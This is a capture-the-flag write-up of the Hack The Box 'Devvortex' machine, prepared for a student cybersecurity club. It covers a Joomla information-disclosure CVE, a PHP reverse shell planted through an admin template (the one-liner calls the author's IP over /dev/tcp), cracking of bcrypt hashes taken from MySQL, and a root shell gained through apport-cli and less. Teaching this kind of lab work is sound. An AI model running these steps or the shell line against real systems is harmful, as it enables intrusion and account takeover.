# Devvortex-Writeup
A write-up of the Hack The Box devvortex machine for the TAMU Cybersecurity Club 

## Recon
`nmap` scan reveals that ports 22 (SSH) and 80 (HTTP) are open. Additionally, the scan shows a redirect to `http://devvortex.htb/`

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/beada65f-3404-49fa-9ebe-b00fb4982f54)

I add `devvortex.htb` to my `/etc/hosts` file

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/a4f886be-9d0e-42ef-aae8-c7622ad3ede9)

## Site "devvortex.htb"
Visitng `http://devvortex.htb`, we are met with this site:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/976241ac-2107-46f0-bf0f-d2f9d2d9cba2)

First, I look for `robots.txt`, but this site appears to not have one:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/1b2d6a03-f35d-4d0e-bd9b-8f07f8995dcd)

Second, I try to find anywhere on the site with user input, which is found in the "Contact Us" page of the website:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/6d027f99-e7a6-49cb-aa7d-f0c22bd690a7)

After filling in the fields with some fuzz input, like an apostrophe, it becomes clear that clicking "send" only refreshes the page and doesn't actually do anything.

With the "Contact Us" page leading nowhere, I begin to search for directories using `gobuster`, which doesn't find anything out of the ordinary:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/46e154ba-13f7-441c-b042-7707821790a9)

Next, still using `gobuster`, I search for any vhosts, which finds the domain, `dev.devvortex.htb`:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/9fa4efc8-5082-4937-ab70-56bd4aa87d00)

I add the domain to my `/etc/hosts` file:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/d6400e15-1ca7-4de6-b65e-3f3bc16a780c)

# Site "dev.devvortex.htb"

Visiting `dev.devvortex.htb`, we are met with this site:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/c0ad3092-4fcb-4863-8a94-11eac46b86e8)

Clicking around, there doesn't seem to be any page on the site that accepts user input. I check to see if this site has a `robots.txt` file, which it does:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/513692e2-9bc0-47c8-ae21-7085c657c253)

There is mention to something called `joomla`, but what intrigues me the most is the `administrator` directory. Let's visit it.

Taking a look at the `administrator` directory, we are met with a `joomla` administrator log in page:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/85755bf8-826e-4b18-9cf2-db24ab94bc17)

Before fuzzing the log in, I first google to see if there are any exploits for joomla, and I find **CVE-2023-23752** on exploit-db [here](https://www.exploit-db.com/exploits/51334). 

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/4f16fb3b-9e1a-426f-ade7-f67da3be428a)

Its an exploit written in ruby. I create a file, `joomla-exploit`, paste the code in, and run it. The file requires one argument, which is the URL of the website. The exploit works, and provides me with information about the database used, but more importantly, log in credentials:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/3c2e5f4b-ce81-46e3-9108-9cb8a2b9a9a7)

I attempt to use these credentials to log in to the `lewis` user via SSH, but no dice:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/256065f6-8521-461d-9c23-fa203153ad94)

I then use the credentials on the log in page found earlier, and I'm able to log in:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/3beb8247-b2df-49a5-a490-1daf2199be42)

# Joomla Dashboard and Reverse Shell

I click around trying to see if there's anything that can lead me to the log in credentials of other users, but I find nothing. Eventually, I finally come across something interesting (which took longer than I'd care to admit).

Found in the `System` tab, under Templates, is `Administrator Templates`:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/d6d4249b-1314-4037-a67b-1dee35c08089)

Clicking here leads us to the server side code of the administrator part of the site, and we can edit it!:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/89b39c08-9cdd-4a39-847c-fa5d5ed64347)

Bingo. From here, we can code in some php that will establish a reverse shell, which can grant us access to the devvortex server itself. We'll be editing the code of the `index.php` page specifically.

On my system, I create a listener on port 69:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/6796b174-f024-468f-ba40-89cb1b41cd73)

Back on the devvortex system, I add the line `exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.4/69 0>&1'");`, with `10.10.16.4` being my system's IP:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/46054c87-6b9e-42d8-b9b9-f686fc0709f4)

I save the file, and back on my system, I get a connection and I now have access onto the devvortex server itself:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/e03da5be-3d6a-4c5e-9434-445e56574380)

# Shell as www-data

First things first, I check to see if the server has python3. It does, so I use it to stabilize the shell using the following commands:

```
 python3 -c "import pty;pty.spawn('/bin/bash')"

 export TERM=xterm
 
 CTRL + Z
 
 stty raw -echo; fg
```
![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/777a6796-7b2b-4868-85e2-4f0089d978d2)

From there, I navigate to the home directory and find a user directory, `logan`. I cd in and find the user flag, but when attempting to read it, I find that I don't have access

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/9a5dee22-acbd-4483-9fc2-4b2be0d8f32e)

Looks like we're going to need to log into Logan first

Looking around the system, I don't find anything that can help me get Logan's password. However, I remember that we have the `mysql` credentials of `lewis`, which was found when we used the **CVE-2023-23752** exploit earlier. Using those credentials, I am able to log into `mysql`

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/3ce50099-f77a-422b-b1d7-a6f624385a36)

# mysql

I list the available databases, and find the database `joomla`:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/46f9919c-364f-4625-a98d-7705ce27a6a6)

Listing the available tables shows a long long list of tables within the `joomla` database:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/73df426d-d577-4f3c-b46e-42aa5d8ff2fa)

Since we are looking for user credentials, I start with the `sd4fg_users` table. From there, I'll go through all the other tables relating to users. Thankfully, I don't have to go through the other tables. When viewing the `sd4fg_users` table, I find 2 usernames and their corresponding password hashes. One of the users just so happens to be our good friend Logan.

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/fe03cfd1-7980-4232-bf7d-8ad1d1f63882)

I put the usernames and password hashes into a file, `tocrack`:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/b8cc0465-a25b-40c5-9360-a007a646e586)

Using a hash identifier tool, I find that the hashes are bcrypt hashes. I then use john the ripper to crack them:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/58b293f8-2f77-41ea-9655-0c94e530e425)
![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/2c1f61b7-788b-41a2-9471-87d76d014ae7)

Logan's password is `tequieromucho`, while lewis' password remains uncracked, but that's alright. We only needed Logan's anyway. With password in hand, we are able to log into Logan's account:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/26804c5d-8363-4751-bfb1-2626cae9910e)

# Shell as Logan and Privilege Escalation

Now that we have access to Logan's account, we can cat the user flag:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/f91c49e7-122d-45fe-900e-476bc6cd087e)

With the user flag out of the way, now onto the root flag.

Using `sudo -l`, I check to see if Logan has any sudo privileges:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/85822e44-3175-4ea3-9ccd-5a24b59c26a3)

So logan can use sudo on something called `apport-cli`. I google to see if there are any known privilege escalation exploits for apport-cli. There is one, **CVE-2023-1326**. Essentially, if you run apport-cli as sudo to view a crash report, it'll execute `less`, from which you can run `!/bin/bash`, which will give you a root shell. Specific details can be found [here](https://nvd.nist.gov/vuln/detail/CVE-2023-1326) and [here](https://diegojoelcondoriquispe.medium.com/cve-2023-1326-poc-c8f2a59d0e00)

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/481d1cd7-bcc4-4fa8-8bc7-9f92588a7987)

Before we go any further though, I'm going to ssh into logan since I'm starting to miss my more colorful terminal:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/e9f69ae4-97f4-4596-afb7-b591f117d0ed)

I look for any already existing crash files, but there appears to be none:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/fccbad99-2a92-4d87-ba17-f743f4254ebf)

It seems that I'll have to make my own crash file or report. Using `man apport-cli`, I find that by using the `-f` flag, I can report a problem and view the report

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/4d06abc2-170b-43f2-8e9b-1d95bf746d81)
![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/ef1152f6-a50f-4a1d-87ff-62d3177bfbb1)

I go through the process of reporting a problem. Some problems result in the program just closing, so it takes a while to find a problem that asks me if I want to view the crash report. Eventually I do find one that allows me to view a report, which was a security related problem (option 3), and the specific issue was "My screen doesn't lock automatically after being idle" (option 7):

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/e0d7819d-7446-4ce7-aff6-ef4ad8e8b705)

I click `V` to view the report, which executes `less`. I enter `!/bin/bash`, and I gain root access:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/ee93ba25-7ef0-400a-bc68-1cbe08dc817c)
![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/bd3617ec-678c-4bad-9bf7-0415a3d55eee)

# Shell as root

Now that I have root access, I cd into the root directory and cat the root flag:

![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/5b5a8167-a447-4ecb-82ee-f4401e847654)
